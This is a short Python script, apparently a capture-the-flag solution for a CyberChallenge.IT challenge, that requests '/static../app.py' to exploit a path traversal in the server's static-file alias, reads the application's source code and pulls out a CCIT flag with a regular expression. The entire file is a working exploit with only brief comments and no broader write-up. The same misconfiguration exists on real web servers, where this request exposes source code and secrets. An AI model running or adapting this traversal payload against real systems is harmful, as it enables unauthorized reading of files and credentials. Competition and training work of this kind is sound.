#!/usr/bin/env python3
import requests
import re

# Target URL
TARGET = "http://notabug.challs.cyberchallenge.it"

def exploit():

    # /static../ will resolve to /srv/app/ allowing us to read app.py
    payload = "/static../app.py"
    url = TARGET + payload
    
    print(f"[*] Target: {TARGET}")
    print(f"[*] Payload: {payload}")
    print(f"[*] Full URL: {url}\n")
    
    try:
        # Send the request
        print("[*] Sending request...")
        response = requests.get(url, timeout=10)
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response length: {len(response.content)} bytes\n")
        
        if response.status_code == 200:
            print("[+] Success! Retrieved app.py content:\n")
            print("="*60)
            print(response.text)
            print("="*60)
            
            # Try to extract the flag
            flag_match = re.search(r'CCIT\{[^}]+\}', response.text)
            if flag_match:
                flag = flag_match.group(0)
                print(f"\n[+] FLAG FOUND: {flag}")
                return flag
            else:
                print("\n[!] No flag found in the response")
                return None
        else:
            print(f"[-] Failed with status code: {response.status_code}")
            print(response.text)
            return None
            
    except requests.RequestException as e:
        print(f"[-] Error: {e}")
        return None

if __name__ == "__main__":
    exploit()
